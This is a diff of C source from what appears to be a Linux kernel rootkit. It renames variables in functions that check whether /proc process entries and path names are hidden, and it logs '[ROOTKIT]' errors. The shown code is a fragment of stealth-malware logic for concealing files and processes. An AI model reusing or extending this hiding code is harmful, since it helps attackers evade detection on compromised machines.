@@ -18,7 +18,7 @@
 
 bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_name, pid_t *p_pid)
 {
-    int i_res                = 0;    // Result of `kstrtoint()` (0 on success)
+    int i32_res              = 0;    // Result of `kstrtoint()` (0 on success)
     const dentry_t *p_parent = NULL; // Parent dentry structure
     pid_t i32_pid            = -1;   // PID of the process found in the path, if any
 
@@ -40,7 +40,7 @@ bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_nam
     }
 
     // Check if the parent directory is /proc/<pid>, with <pid> being a number
-    i_res = kstrtoint(p_parent->d_name.name, 10, &i32_pid);
+    i32_res = kstrtoint(p_parent->d_name.name, 10, &i32_pid);
 
     if (ps_name != NULL) {
         // Set ps_name to the name of the first directory in the path after its root
@@ -49,10 +49,10 @@ bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_nam
 
     if (p_pid != NULL) {
         // Set p_pid to the corresponding PID, if this is a process file
-        *p_pid = i_res ? -1 : i32_pid;
+        *p_pid = i32_res ? -1 : i32_pid;
     }
 
-    return i_res == 0;
+    return i32_res == 0;
 }
 
 bool is_dentry_hidden(const dentry_t *const p_dentry)
@@ -88,7 +88,7 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
                         unsigned int ui32_lookup_flags)
 {
     bool b_ret               = false; // Return value
-    int i_err                = 0;     // Error code
+    int i32_err              = 0;     // Error code
     bool b_lookup_parents    = false; // Whether to only check parent directories
     const char *s_pathname_k = NULL;  // Kernel buffer for path name
     path_t path;                      // Path structure
@@ -101,12 +101,12 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
     }
 
     // First, check without following symlinks
-    i_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags & ~LOOKUP_FOLLOW, &path);
+    i32_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags & ~LOOKUP_FOLLOW, &path);
 
-    IF_U (i_err != 0) {
+    IF_U (i32_err != 0) {
         s_pathname_k = strndup_user(s_pathname, PATH_MAX);
         pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (not following symlinks)\n",
-               s_pathname_k, i_err);
+               s_pathname_k, i32_err);
         kfree_const(s_pathname_k);
         return false;
     }
@@ -130,12 +130,12 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
     }
 
     // Check again, this time following symlinks
-    i_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags, &path);
+    i32_err = user_path_at(i32_dfd, s_pathname, ui32_lookup_flags, &path);
 
-    IF_U (i_err != 0) {
+    IF_U (i32_err != 0) {
         s_pathname_k = strndup_user(s_pathname, PATH_MAX);
         pr_err("[ROOTKIT]   * Could not get path for %s (error: %d) (following symlinks)\n",
-               s_pathname_k, i_err);
+               s_pathname_k, i32_err);
         kfree_const(s_pathname_k);
         return false;
     }
